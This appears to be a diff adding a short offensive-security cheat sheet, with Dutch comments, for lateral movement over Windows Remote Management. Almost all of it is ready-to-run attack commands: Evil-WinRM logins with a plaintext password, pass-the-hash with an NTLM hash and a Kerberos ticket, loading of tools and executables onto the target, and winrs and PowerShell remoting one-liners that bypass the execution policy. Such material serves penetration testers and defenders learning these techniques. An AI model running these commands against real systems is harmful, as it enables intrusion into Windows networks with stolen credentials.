@@ -1,0 +1,15 @@
+# Lateral Movement via WinRM / Evil-WinRM
+# Methode 1: Evil-WinRM (meest gebruiksvriendelijk)
+evil-winrm -i TARGET_IP -u user -p 'Password123!'
+# Met scripts en executables laden:
+evil-winrm -i TARGET_IP -u user -p 'Password123!' -s /opt/tools/ -e /opt/tools/
+# Met NTLM hash (Pass-the-Hash):
+evil-winrm -i TARGET_IP -u user -H NTLM_HASH
+# Met Kerberos ticket:
+evil-winrm -i TARGET_IP -r DOMAIN.LOCAL
+# Methode 2: winrs (Windows native)
+winrs -r:TARGET -u:DOMAIN\user -p:Password123! "powershell -ep bypass -c whoami;hostname"
+# Methode 3: PowerShell remoting one-liner
+powershell -c "Invoke-Command -ComputerName TARGET -ScriptBlock {whoami;hostname} -Credential (Get-Credential)"
+# Tip: Poort 5985 (HTTP) of 5986 (HTTPS)
+# Tip: Evil-WinRM heeft ingebouwde upload/download en module loading
